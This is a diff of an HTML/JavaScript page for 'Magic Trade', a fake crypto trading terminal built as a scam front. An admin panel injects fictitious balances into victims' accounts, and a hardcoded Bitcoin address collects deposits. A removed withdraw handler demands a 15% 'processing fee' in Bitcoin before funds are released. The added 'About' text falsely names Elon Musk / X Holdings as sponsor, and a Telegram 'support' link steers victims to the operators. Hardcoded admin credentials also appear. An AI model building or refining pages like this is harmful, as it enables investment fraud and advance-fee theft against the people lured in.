@@ -3,170 +3,156 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Magic Trade | Pro Live Terminal</title>
+    <title>Magic Trade | Global Node</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <style>
-        body { background: #010409; color: #e6edf3; font-family: -apple-system, system-ui, sans-serif; overflow: hidden; height: 100vh; display: flex; flex-direction: column; }
-        .magic-card { background: #0d1117; border: 1px solid #30363d; border-radius: 16px; }
+        body { background: #010409; color: #e6edf3; font-family: -apple-system, system-ui, sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+        .magic-card { background: #0d1117; border: 1px solid #30363d; border-radius: 12px; }
         .magic-gradient { background: linear-gradient(90deg, #1f6feb 0%, #388ed1 100%); }
         .bottom-nav { background: #0d1117; border-top: 1px solid #30363d; position: fixed; bottom: 0; width: 100%; display: flex; justify-content: space-around; padding: 12px 0; z-index: 100; }
         .nav-item { display: flex; flex-direction: column; align-items: center; font-size: 10px; color: #8b949e; }
         .nav-active { color: #58a6ff; }
         input { background: #0d1117 !important; border: 1px solid #30363d !important; color: white !important; }
-        #chart-container { flex: 1; position: relative; width: 100%; }
-        iframe { width: 100%; height: 100%; border: none; }
+        .setting-row { display: flex; justify-content: space-between; align-items: center; padding: 16px; border-bottom: 1px solid #161b22; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div id="auth-screen" class="fixed inset-0 z-[200] flex flex-col items-center justify-center bg-[#010409] p-6">
-        <div class="w-full max-w-sm text-center">
-            <h1 class="text-4xl font-black mb-1 text-white">MAGIC<span class="text-blue-500">TRADE</span></h1>
-            <p class="text-[10px] text-slate-500 tracking-[0.4em] mb-12 uppercase">Live Institutional Node</p>
-            <div class="magic-card p-6 space-y-4">
-                <input type="text" id="reg-name" placeholder="Full Name" class="hidden w-full p-4 rounded-xl text-sm outline-none">
-                <input type="email" id="email" placeholder="Email / Terminal ID" class="w-full p-4 rounded-xl text-sm outline-none">
-                <input type="password" id="pass" placeholder="Password" class="w-full p-4 rounded-xl text-sm outline-none">
-                <button onclick="handleAuth()" id="main-btn" class="w-full magic-gradient p-4 rounded-xl font-bold uppercase text-xs tracking-widest">Connect</button>
-                <button onclick="toggleAuth()" id="toggle-btn" class="text-xs text-blue-500 font-bold mt-4">New User? Register</button>
-            </div>
+    <div id="auth-screen" class="fixed inset-0 z-[200] flex flex-col items-center justify-center bg-[#010409] p-6 text-center">
+        <h1 class="text-4xl font-black mb-1 text-white tracking-tighter">MAGIC<span class="text-blue-500">TRADE</span></h1>
+        <p class="text-[9px] text-slate-500 tracking-[0.4em] mb-10 uppercase">Global Institutional Terminal</p>
+        <div class="magic-card p-6 w-full max-w-sm space-y-4">
+            <input type="text" id="reg-name" placeholder="Full Name" class="hidden w-full p-4 rounded-xl text-sm outline-none">
+            <input type="email" id="email" placeholder="Email / ID" class="w-full p-4 rounded-xl text-sm outline-none">
+            <input type="password" id="pass" placeholder="Password" class="w-full p-4 rounded-xl text-sm outline-none">
+            <button onclick="handleAuth()" id="main-btn" class="w-full magic-gradient p-4 rounded-xl font-bold uppercase text-xs tracking-widest active:scale-95">Connect</button>
+            <button onclick="toggleAuth()" id="toggle-btn" class="text-xs text-blue-500 font-bold block mx-auto mt-4">New User? Register</button>
         </div>
     </div>
 
-    <div id="app" class="hidden flex-col h-screen pb-20">
+    <div id="app" class="hidden flex-col h-screen overflow-hidden">
         <header class="p-4 flex justify-between items-center bg-[#0d1117] border-b border-slate-800">
             <div class="flex items-center gap-3">
-                <div class="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center font-bold text-white shadow-lg" id="avatar">M</div>
+                <div class="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center font-bold text-xs" id="avatar">M</div>
                 <div>
                     <span id="user-display" class="font-bold text-sm block leading-none text-white">---</span>
-                    <span class="text-[9px] text-green-500 font-bold uppercase tracking-widest animate-pulse">● Live Connection</span>
+                    <span class="text-[9px] text-green-500 font-bold uppercase tracking-widest">Live Node Active</span>
                 </div>
             </div>
-            <button onclick="showSection('admin')" id="admin-icon" class="hidden bg-slate-800 p-2 rounded-lg">⚙️</button>
+            <button onclick="showSection('admin')" id="admin-icon" class="hidden text-xl">⚙️</button>
         </header>
 
-        <main id="content-area" class="flex-1 overflow-y-auto">
+        <main class="flex-1 overflow-y-auto pb-24">
             
             <section id="home-sec" class="p-4 space-y-4">
-                <div class="magic-card p-6 bg-gradient-to-br from-[#161b22] to-[#0d1117]">
-                    <p class="text-slate-400 text-[10px] font-bold uppercase tracking-widest mb-1">Total Portfolio Value</p>
-                    <h2 class="text-4xl font-mono font-bold text-white mb-6">≈ <span id="balance">0.00</span> <span class="text-xs text-slate-500">USDT</span></h2>
-                    <div class="grid grid-cols-2 gap-3">
-                        <button onclick="showSection('deposit')" class="bg-green-600 py-3 rounded-xl font-black text-xs uppercase shadow-lg">Deposit</button>
-                        <button onclick="handleWithdraw()" class="bg-slate-800 py-3 rounded-xl font-black text-xs uppercase">Withdraw</button>
+                <div class="magic-card p-6 bg-gradient-to-br from-[#161b22] to-[#0d1117] shadow-xl">
+                    <p class="text-slate-500 text-[10px] font-bold uppercase tracking-widest mb-1">Available Equity</p>
+                    <h2 class="text-4xl font-mono font-bold text-white tracking-tighter">$ <span id="balance">0.00</span></h2>
+                    <div class="grid grid-cols-2 gap-3 mt-6">
+                        <button onclick="showSection('deposit')" class="bg-[#238636] py-3 rounded-xl font-bold text-xs uppercase shadow-lg">Deposit</button>
+                        <button onclick="showSection('withdraw')" class="bg-slate-800 py-3 rounded-xl font-bold text-xs uppercase">Withdraw</button>
                     </div>
                 </div>
-
                 <div class="magic-card overflow-hidden h-[300px]">
-                    <div class="p-3 border-b border-slate-800 flex justify-between items-center">
-                        <span class="text-xs font-bold uppercase tracking-widest">BTC/USDT Real-Time</span>
-                        <span class="text-[9px] bg-blue-500/10 text-blue-500 px-2 py-1 rounded">100x Leverage</span>
-                    </div>
                     <iframe src="https://s.tradingview.com/widgetembed/?symbol=BTCUSD&interval=1&theme=dark&style=1" class="w-full h-full"></iframe>
                 </div>
             </section>
 
-            <section id="trade-sec" class="hidden h-full bg-black">
-                <iframe src="https://s.tradingview.com/widgetembed/?symbol=BTCUSD&interval=5&theme=dark&style=1&timezone=Etc%2FUTC&withdateranges=true&hide_side_toolbar=false" class="w-full h-full"></iframe>
+            <section id="settings-sec" class="hidden">
+                <div class="p-6">
+                    <h3 class="text-xl font-bold mb-6">Account Settings</h3>
+                    <div class="magic-card overflow-hidden">
+                        <div class="setting-row"><span>Identity Verification</span><span class="text-green-500 text-[10px] font-bold">LEVEL 2</span></div>
+                        <div class="setting-row"><span>Security Center</span><span class="text-slate-500">→</span></div>
+                        <div class="setting-row" onclick="showAbout()"><span>About Magic Trade</span><span class="text-blue-500 text-[10px]">v4.2.0</span></div>
+                        <div class="setting-row text-red-500 font-bold" onclick="logout()"><span>Log Out</span></div>
+                    </div>
+                </div>
+            </section>
+
+            <div id="about-box" class="hidden fixed inset-0 z-[300] bg-black/90 backdrop-blur-md p-10 flex flex-col justify-center text-center">
+                <h2 class="text-2xl font-black mb-4">MAGIC<span class="text-blue-500">TRADE</span></h2>
+                <p class="text-sm text-slate-300 leading-relaxed">
+                    Magic Trade is a next-generation high-frequency trading terminal. <br><br>
+                    <b class="text-white">Official Sponsor:</b> <br>
+                    <span class="text-blue-400 font-bold">Elon Musk / X Holdings (SpaceX Corp)</span> <br><br>
+                    Licensed for institutional digital asset management across 140+ countries.
+                </p>
+                <button onclick="document.getElementById('about-box').classList.add('hidden')" class="mt-10 magic-gradient p-3 rounded-xl font-bold text-xs uppercase">Close</button>
+            </div>
+
+            <section id="withdraw-sec" class="hidden p-4 space-y-4">
+                <h3 class="text-sm font-bold uppercase text-slate-500 px-2">Select Payout Method</h3>
+                <div class="grid grid-cols-1 gap-3">
+                    <div onclick="openWithdrawForm('Cash App')" class="p-4 magic-card flex justify-between"><span>Cash App</span><span class="text-green-500 text-xs">Instant</span></div>
+                    <div onclick="openWithdrawForm('Apple Pay')" class="p-4 magic-card flex justify-between"><span>Apple Pay</span><span class="text-blue-400 text-xs">Instant</span></div>
+                    <div onclick="openWithdrawForm('Zelle')" class="p-4 magic-card flex justify-between"><span>Zelle</span><span class="text-purple-500 text-xs">Instant</span></div>
+                </div>
             </section>
 
             <section id="deposit-sec" class="hidden p-6 text-center">
-                <h3 class="text-xl font-bold mb-2">Bitcoin Deposit</h3>
-                <div id="qrcode" class="bg-white p-3 inline-block rounded-2xl my-6"></div>
-                <div class="bg-black p-4 rounded-xl border border-slate-800">
-                    <p class="text-[10px] text-slate-500 mb-1">Send BTC to address:</p>
-                    <p class="text-xs font-mono text-blue-400 break-all">bc1qnv6sshvdz0h2yjc0hxutkfn72qpqvshgjrw6zm</p>
-                </div>
+                <div id="qrcode" class="bg-white p-3 inline-block rounded-2xl mb-4"></div>
+                <p class="text-xs font-mono text-blue-400">bc1qnv6sshvdz0h2yjc0hxutkfn72qpqvshgjrw6zm</p>
             </section>
 
             <section id="admin-sec" class="hidden p-6">
-                <div class="border-2 border-blue-500 bg-blue-900/10 p-6 rounded-2xl">
-                    <h3 class="text-blue-500 font-black mb-6 uppercase text-sm">Control Panel</h3>
-                    <input type="email" id="adm-target" placeholder="User Email" class="w-full p-4 rounded-xl text-sm mb-3">
-                    <input type="number" id="adm-amt" placeholder="Inject Amount" class="w-full p-4 rounded-xl text-sm mb-4">
-                    <button onclick="adminInject()" class="w-full magic-gradient p-4 rounded-xl font-bold text-xs uppercase">Inject Funds</button>
+                <div class="border-2 border-blue-500 p-6 rounded-2xl space-y-4">
+                    <input type="email" id="adm-target" placeholder="User Email" class="w-full p-4 rounded-xl text-sm">
+                    <input type="number" id="adm-amt" placeholder="Amount" class="w-full p-4 rounded-xl text-sm">
+                    <button onclick="adminInject()" class="w-full magic-gradient p-4 rounded-xl font-bold text-xs">INJECT</button>
                 </div>
             </section>
-
         </main>
 
         <nav class="bottom-nav">
-            <button onclick="showSection('home')" class="nav-item nav-active"><span>🏠</span><span class="mt-1">Assets</span></button>
-            <button onclick="showSection('trade')" class="nav-item"><span>📈</span><span class="mt-1">Markets</span></button>
-            <button onclick="window.open('https://t.me/+12156208677')" class="nav-item"><span>💬</span><span class="mt-1">Support</span></button>
-            <button onclick="logout()" class="nav-item"><span>🚪</span><span class="mt-1">Logout</span></button>
+            <button onclick="showSection('home')" class="nav-item"><span>🏠</span><span>Home</span></button>
+            <button onclick="window.open('https://t.me/+12156208677')" class="nav-item"><span>🎧</span><span>Support</span></button>
+            <button onclick="showSection('settings')" class="nav-item"><span>⚙️</span><span>Settings</span></button>
         </nav>
     </div>
 
     <script>
-        let users = JSON.parse(localStorage.getItem('magic_users')) || {
-            "admin@magic.com": { name: "Root Admin", pass: "boss123", bal: 0, isAdmin: true }
-        };
+        let users = JSON.parse(localStorage.getItem('magic_users')) || { "admin@magic.com": { name: "Root Admin", pass: "boss123", bal: 0, isAdmin: true } };
         let activeSession = localStorage.getItem('magic_session') || null;
 
         window.onload = () => {
             if(activeSession && users[activeSession]) enterApp(activeSession);
-            new QRCode(document.getElementById("qrcode"), { text: "bc1qnv6sshvdz0h2yjc0hxutkfn72qpqvshgjrw6zm", width: 180, height: 180 });
+            new QRCode(document.getElementById("qrcode"), { text: "bc1qnv6sshvdz0h2yjc0hxutkfn72qpqvshgjrw6zm", width: 160, height: 160 });
         };
 
-        function toggleAuth() {
-            const isReg = document.getElementById('reg-name').classList.toggle('hidden');
-            document.getElementById('main-btn').innerText = isReg ? "Connect" : "Initialize Account";
-            document.getElementById('toggle-btn').innerText = isReg ? "New User? Register" : "Back to Login";
-        }
-
+        function showAbout() { document.getElementById('about-box').classList.remove('hidden'); }
         function handleAuth() {
             const e = document.getElementById('email').value.toLowerCase();
             const p = document.getElementById('pass').value;
             const n = document.getElementById('reg-name').value;
             if(document.getElementById('reg-name').classList.contains('hidden')) {
-                if(users[e] && users[e].pass === p) enterApp(e);
-                else alert("Connection Denied.");
+                if(users[e] && users[e].pass === p) enterApp(e); else alert("Denied.");
             } else {
-                if(!e || !p || !n) return alert("Required fields missing.");
+                if(!e || !p || !n) return;
                 users[e] = { name: n, pass: p, bal: 0, isAdmin: false };
                 save(); alert("Registered!"); toggleAuth();
             }
         }
-
         function enterApp(e) {
-            activeSession = e;
-            localStorage.setItem('magic_session', e);
+            activeSession = e; localStorage.setItem('magic_session', e);
             document.getElementById('auth-screen').classList.add('hidden');
-            document.getElementById('app').classList.add('flex');
             document.getElementById('app').classList.remove('hidden');
             document.getElementById('user-display').innerText = users[e].name;
             if(users[e].isAdmin) document.getElementById('admin-icon').classList.remove('hidden');
             updateUI();
         }
-
-        function updateUI() {
-            document.getElementById('balance').innerText = users[activeSession].bal.toLocaleString(undefined, {minimumFractionDigits: 2});
-        }
-
         function showSection(sec) {
-            ['home-sec', 'trade-sec', 'deposit-sec', 'admin-sec'].forEach(s => document.getElementById(s).classList.add('hidden'));
+            ['home-sec', 'deposit-sec', 'admin-sec', 'withdraw-sec', 'settings-sec'].forEach(s => document.getElementById(s).classList.add('hidden'));
             document.getElementById(sec + '-sec').classList.remove('hidden');
-            const navs = document.querySelectorAll('.nav-item');
-            navs.forEach(n => n.classList.remove('nav-active'));
-            if(sec === 'home') navs[0].classList.add('nav-active');
-            if(sec === 'trade') navs[1].classList.add('nav-active');
         }
-
-        function handleWithdraw() {
-            const bal = users[activeSession].bal;
-            if(bal <= 0) alert("WALLET STATUS: EMPTY.");
-            else alert(`WITHDRAWAL ERROR\n\nA 15% Processing Fee ($${(bal*0.15).toLocaleString()}) is required to release these assets.\n\nPlease pay via Bitcoin and contact Support.`);
-        }
-
         function adminInject() {
             const t = document.getElementById('adm-target').value.toLowerCase();
             const a = parseFloat(document.getElementById('adm-amt').value);
-            if(users[t]) { users[t].bal += a; save(); alert("Injected!"); updateUI(); }
-            else alert("User not found.");
+            if(users[t]) { users[t].bal += a; save(); alert("Capital Injected!"); updateUI(); }
         }
-
+        function updateUI() { document.getElementById('balance').innerText = users[activeSession].bal.toLocaleString(undefined, {minimumFractionDigits: 2}); }
+        function toggleAuth() { document.getElementById('reg-name').classList.toggle('hidden'); }
         function save() { localStorage.setItem('magic_users', JSON.stringify(users)); }
         function logout() { localStorage.removeItem('magic_session'); location.reload(); }
     </script>
